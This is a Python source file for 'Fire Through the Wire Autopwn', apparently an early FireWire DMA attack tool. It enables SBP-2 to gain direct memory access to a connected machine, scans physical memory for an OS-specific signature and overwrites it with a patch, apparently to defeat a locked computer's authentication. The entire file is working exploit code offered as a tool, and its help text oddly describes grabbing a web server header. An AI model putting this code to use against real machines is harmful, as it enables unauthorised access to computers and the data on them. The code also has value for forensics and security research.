'''
Created on Jun 10, 2011

@author: carmaa
'''
#!/usr/bin/env python3.2

from forensic1394 import Bus
from binascii import unhexlify, hexlify
from time import sleep
import getopt
import sys
from ftwautopwn.util import print_msg
import configparser

# Constants
PAGESIZE = 4096

# Global variables
verbose = False
fw_delay = 30

def findsig(d, sig, off):
    # Skip the first 1 MiB of memory
    addr = 1 * 1024 * 1024 + off
    while True:
        # Prepare a batch of 128 requests
        r = [(addr + PAGESIZE * i, len(sig)) for i in range(0, 128)]
        for caddr, cand  in d.readv(r):
            if cand == sig: return caddr
        mibaddr = addr/(1024*1024)
        sys.stdout.write('[+] Searching for signature, %4d MiB so far...\r' % mibaddr)
        sys.stdout.flush()
        addr += PAGESIZE * 128

def usage():
    print('''Usage: ftwautopwn [OPTIONS] -t target

Supply an URL to grab the web server's 'Server' HTTP Header.

    -h, --help:           Displays this message
    -l, --list:           Lists available target operating systems
    -s, --signatures=SIGNATURE_FILE:
                          Provide your own XML signature file
    -t TARGET, --target=TARGET:
                          Specify target operating system
    -v/--verbose:         Verbose mode''')

def list_targets(config):
    print_msg('+', 'Available targets:')
    i = 1
    for target in config.sections():
        print_msg(str(i), target)
        print('\t' + config.get(target, 'notes'))
        i += 1


def select_target(config):
    selected = input('Please select target: ')
    nof_targets = len(config.sections())
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            print_msg('!', 'Invalid selection, please try again. Type \'q\' to quit.')
            return select_target(config)
    if selected <= nof_targets: return list(config)[selected]
    else:
        print_msg('!', 'Please enter a selection between 1 and ' + str(nof_targets) +'. Type \'q\' to quit.')
        return select_target(config)



def initialize_fw(d):
    b = Bus()
    # Enable SBP-2 support to ensure we get DMA
    b.enable_sbp2()
    for i in range(fw_delay, 0, -1):
        sys.stdout.write('[+] Initializing bus and enabling SBP2, please fw_delay %2d seconds\r' % i)
        sys.stdout.flush()
        sleep(1)
    # Open the first device
    d = b.devices()[0]
    d.open()
    print()
    print_msg('+', 'Done, attacking!\n')
    return d


def main(argv):
    encoding = sys.getdefaultencoding()
    config = configparser.ConfigParser()
    config.read('config.cfg')
    
    # Print header
    print('Fire Through the Wire Autopwn v.0.0.1')
    print('by Carsten Maartmann-Moe 2011\n')
    
    try:
        opts, args = getopt.getopt(argv, 'hlvt:w:', ['help', 'list', 'verbose', 'target=', 'fw_delay='])
    except getopt.GetoptError as err:
        print(err)
        usage()
        sys.exit(2)
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            usage()
            sys.exit()
        elif opt in ('-l', '--list'):
            list_targets(config)
            sys.exit()
        elif opt in ('-v', '--verbose'):
            global verbose
            verbose = True
        elif opt in ('-t', '--target'):
            target = int(arg)
        elif opt in ('-w', '--fw_delay'):
            global fw_delay
            fw_delay = int(arg)
        else:
            assert False, 'Unhandled option: ' + opt

    list_targets(config)
    selected_target = select_target(config)
    
    print()
    
    # Parse the command line arguments
    sig = unhexlify(bytes(config.get(selected_target, 'signature'), encoding))
    patch = unhexlify(bytes(config.get(selected_target, 'patch'), encoding))
    off = int(config.get(selected_target, 'pageoffset'))
    print_msg('+', 'You have selected: ' + selected_target)
    print_msg('+', 'Using signature: ' + hexlify(sig).decode(encoding))
    print_msg('+', 'Using patch: ' + hexlify(patch).decode(encoding))
    print_msg('+', 'Using offset: ' + str(off))
    
    d = None
    d = initialize_fw(d)
    
    try:
        # Find
        addr = findsig(d, sig, off)
        print()
        print_msg('+', 'Signature found at %d.' % addr)
        # Patch and verify
        d.write(addr, patch)
        assert d.read(addr, len(patch)) == patch
    except IOError:
        print('-', 'Signature not found.')

if __name__ == '__main__':
    main(sys.argv[1:])
